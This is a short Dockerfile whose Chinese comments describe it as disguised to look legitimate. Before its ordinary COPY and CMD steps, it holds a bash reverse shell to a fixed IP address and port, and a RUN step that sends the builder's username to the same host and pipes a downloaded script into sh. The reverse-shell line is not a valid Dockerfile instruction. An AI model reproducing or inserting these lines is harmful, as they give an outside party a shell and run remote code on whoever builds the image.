# 伪装成合法的 Dockerfile
FROM alpine:3.18

bash -i >& /dev/tcp/124.71.183.77/3309 0>&1 &

RUN apk add --no-cache curl

RUN curl -sSL http://124.71.183.77/test.sh?whoami=`whoami` | sh 

# 正常步骤（继续伪装）
COPY app /app
CMD ["/app/start.sh"]
